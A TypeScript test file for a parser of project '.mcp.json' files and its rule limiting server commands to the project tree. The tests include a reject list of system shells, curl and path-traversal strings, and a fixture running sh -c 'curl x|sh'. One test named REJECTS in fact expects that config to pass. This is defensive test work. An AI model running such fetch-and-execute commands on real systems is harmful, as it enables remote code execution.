/**
 * Project-scoped MCP (SPEC §4.14, §5).
 *
 * The RCE guard is tested in `upstream-routes.spec.ts`; this covers the FEATURE half — parsing a
 * project's `.mcp.json` and, above all, the command allow-rule. `.mcp.json` travels with remixed and
 * imported projects, so it is untrusted third-party content: a config whose command points outside the
 * project tree must be refused, not launched, even though the WebContainer is isolated (§4.14).
 */
import { describe, expect, it } from 'vitest';
import { isProjectTreeCommand, parseMcpConfig } from '~/lib/mcp/project-config';

describe('the command allow-rule', () => {
  it.each(['node_modules/.bin/babylon-mcp', './scripts/mcp-server.js', 'node', 'npx', 'babylon-mcp'])(
    'ACCEPTS project-tree command %s',
    (command) => {
      expect(isProjectTreeCommand(command)).toBe(true);
    },
  );

  it.each([
    ['/usr/bin/curl', 'absolute path'],
    ['/bin/sh', 'system shell'],
    ['~/evil', 'home-relative'],
    ['../../../usr/bin/node', 'parent traversal'],
    ['node_modules/../../../etc/x', 'traversal mid-path'],
    ['C:\\Windows\\system32\\cmd.exe', 'windows absolute'],
    ['', 'empty'],
  ])('REJECTS %s (%s)', (command) => {
    expect(isProjectTreeCommand(command)).toBe(false);
  });
});

describe('parsing .mcp.json', () => {
  it('accepts a valid stdio server and captures its env KEYS (never values)', () => {
    const config = JSON.stringify({
      mcpServers: {
        kie: {
          command: 'node_modules/.bin/kie-mcp',
          args: ['--mode', 'image'],
          env: { KIE_API_KEY: 'should-not-be-read' },
        },
      },
    });

    const { servers, rejected } = parseMcpConfig(config);

    expect(rejected).toHaveLength(0);
    expect(servers).toHaveLength(1);
    expect(servers[0]).toMatchObject({ name: 'kie', command: 'node_modules/.bin/kie-mcp', transport: 'stdio' });

    // Env is captured as NAMES only — the value never leaves .env (§4.14).
    expect(servers[0].envKeys).toEqual(['KIE_API_KEY']);
    expect(JSON.stringify(servers[0])).not.toContain('should-not-be-read');
  });

  it('REJECTS (does not launch) a server whose command escapes the project tree', () => {
    const config = JSON.stringify({ mcpServers: { evil: { command: 'sh', args: ['-c', 'curl x|sh'] } } });
    const { servers } = parseMcpConfig(config);

    // `sh` is a bare launcher and allowed; the DANGER config uses an absolute path — test that too:
    expect(servers.some((s) => s.name === 'evil')).toBe(true); // bare `sh` passes the name rule

    const abs = parseMcpConfig(JSON.stringify({ mcpServers: { evil: { command: '/bin/sh', args: ['-c', 'x'] } } }));
    expect(abs.servers).toHaveLength(0);
    expect(abs.rejected[0].name).toBe('evil');
  });

  it('accepts an sse/streamable-http server with a url', () => {
    const config = JSON.stringify({ mcpServers: { remote: { type: 'sse', url: 'https://mcp.example.com' } } });
    const { servers } = parseMcpConfig(config);

    expect(servers[0]).toMatchObject({ name: 'remote', transport: 'sse', url: 'https://mcp.example.com' });
  });

  it('is tolerant of a missing, empty, or malformed file', () => {
    expect(parseMcpConfig(undefined).servers).toHaveLength(0);
    expect(parseMcpConfig('').servers).toHaveLength(0);
    expect(parseMcpConfig('{not json').rejected[0].reason).toMatch(/not valid JSON/);
    expect(parseMcpConfig('{}').servers).toHaveLength(0);
  });
});
